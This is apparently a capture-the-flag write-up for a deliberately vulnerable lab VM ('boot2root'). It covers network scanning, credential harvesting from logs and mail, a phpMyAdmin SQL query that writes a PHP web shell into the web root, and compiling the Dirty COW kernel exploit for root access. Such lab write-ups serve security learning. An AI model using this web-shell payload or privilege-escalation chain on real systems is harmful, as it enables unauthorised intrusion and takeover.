## Searching IP address of out virtual machine.

``
ifconfig - needed for searching IP. 
``

![
vmnet8: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	ether 00:50:56:c0:00:08
	inet 172.16.101.1 netmask 0xffffff00 broadcast 172.16.101.255
](/imgs/img1.png)

## Using nmap to find info about our IP address.
``
nmap 172.16.101.1-255
``

![
PORT   STATE SERVICE
22/tcp open  ssh
Nmap scan report for 172.16.101.128
Host is up (0.0012s latency).
Not shown: 994 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
Nmap done: 255 IP addresses (2 hosts up) scanned in 27.37 seconds
](/imgs/img2.png)
``172.16.101.128 IP of our VM``

## Checking links by address.
``git clone https://github.com/v0re/dirb.git``

### Install and use dirb
```
cd dirb
./confgiure
make
```
``./dirb https://172.16.101.128/ wordlists/common.txt``

## Checking links of forum.
After logging in to the forum, we find a branch of 'Probleme login?'.
Walking through the logs we find two lines:

### The first input was supposed to be confused lines for login and password.
![
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
](/imgs/img3.png)

### In the second login was correct.
![
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard 
](/imgs/img4.png)

## Attempt to enter the e-mail with the received login and password.
Follow the link ``https://172.16.101.128/webmail/src/login.php``
With login ``lmezard`` and password ``!q\]Ej?*5K5cy*AJ`` not working.
Trying to search login ``lmezard`` in google :
![
Google info about lmezard. Laurie Mezard
](/imgs/img5.png)
We were given the full name Laurie Mezard. Trying different options for login.
The option we need is `` laurie@borntosec.net``.
Enter the email `` login: laurie@borntosec.net` and `` password:! !q\]Ej?*5K5cy*AJ``
Searching info in mail we find a letter:
![
Hey Laurie,
You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
Best regards.
](/imgs/img6.png)
Find the password and login for the database ``login: root`` and ``password: Fg-'kKXBj87E:aJ$``

## Attempt to login phpmyadmin.
Follow thi link ``https://172.16.101.128/phpmyadmin/``
With login and password we enter in the database.
After searching the network, we find an exploit for db.
``select "<?php $output = shell_exec('cat /home/LOOKATME/password'); echo $output ?>" into outfile "/var/www/forum/templates_c/pokemon.php"``
Go to the sqltab in the same phpmyadmin window to which we are logged in.
Execute the script.
Script created a new template for the link ``https://172.16.101.128/forum/templates_c/pokemon.php`` where we can find ``lmezard:G!@M6f4Eatau{sF"``.

## Attempt to connect by ftp.
``ftp 172.16.101.128``
``login: lmezard``
``password: G!@M6f4Eatau{sF"``
Login was successful, checking the directory:
![
README.md
fun
](/imgs/img7.png)
Now we downloading file ``get fun ~/boot2root/fun``
In the file a lot of different information, if you look at the file type ``file fun`` we found out that file is an archive.
Unzip the archive ``tar xvf fun``
We receive the whole folder with different files. When viewing each file, we recognize that
there is a line with a license plate and a piece of code.
We use a small script that will collect everything from the files, sort it and then create a new main.c file.
``python unpack.py``
``gcc main.c``
``./a.out``
After run we get:
 ![
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
](/imgs/img8.png)
Encrypt it in SHA-256 and get:
``330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4``
## Attempt to login via ssh.
``ssh laurie@172.16.101.128``
``login: laurie``
``password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4``
Login was success.
Now we need to find out what kind of server it is to correctly google exploit for root.
``uname -r`` -> 3.2.0-91-generic-pae
``cat /etc/*-release`` -> DISTRIB_DESCRIPTION="Ubuntu 12.04.5 LTS"
With the obtained data, we do a search in Google and find this [link](https://www.exploit-db.com/exploits/40839).
Create this script on the server, we did it through vim.
``touch pokemon.c``
``vim pokemon.c`` -> ``CMD + C`` -> ``CMD + V``
``gcc -pthread pokemon.c -o dirty -lcrypt && ./dirty``
Now we set some password.
``su firefart``
# U are root.

















